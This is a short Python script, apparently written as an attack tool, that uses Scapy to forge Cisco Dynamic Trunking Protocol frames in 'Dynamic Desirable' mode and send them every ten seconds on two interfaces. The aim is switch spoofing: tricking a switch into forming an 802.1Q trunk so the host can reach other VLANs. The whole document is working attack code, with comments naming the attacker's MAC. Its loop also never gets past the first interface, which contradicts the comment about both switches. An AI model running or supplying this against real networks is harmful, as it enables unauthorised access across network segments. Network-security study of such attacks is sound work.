from scapy.all import *
from scapy.contrib.dtp import DTP, DTPNeighbor, DTPStatus, DTPType
import time

# Function to get the MAC address of an interface
def get_mac_address(interface):
    return open(f'/sys/class/net/{interface}/address').read().strip()

# Interface names (eth0 for Switch 1, eth1 for Switch 2)
interfaces = ["eth0", "eth1"]

# Function to craft and send a custom DTP packet
def send_custom_dtp_packet(interface):
    # Get the MAC address of the interface
    mac = get_mac_address(interface)
    print(f"Using MAC address {mac} for interface {interface}")

    # Craft a DTP packet
    dtp_packet = (
        Ether(dst="01:00:0c:cc:cc:cc", src=mac, type=0x2004) /  # DTP multicast destination and MAC of attacker
        DTP(
            tlvlist=[
                DTPNeighbor(neighbor=mac),                      # Your MAC address as the DTP neighbor
                DTPStatus(status=b'\x03'),                      # Dynamic Desirable mode (actively trying to trunk)
                DTPType(dtptype=b'E')                           # Trunk type 802.1Q
            ]
        )
    )

    # Send the DTP packet in a loop
    while True:
        sendp(dtp_packet, iface=interface, verbose=1)
        time.sleep(10)

# Send DTP packets to both switches (via eth0 and eth1)
for interface in interfaces:
    send_custom_dtp_packet(interface)
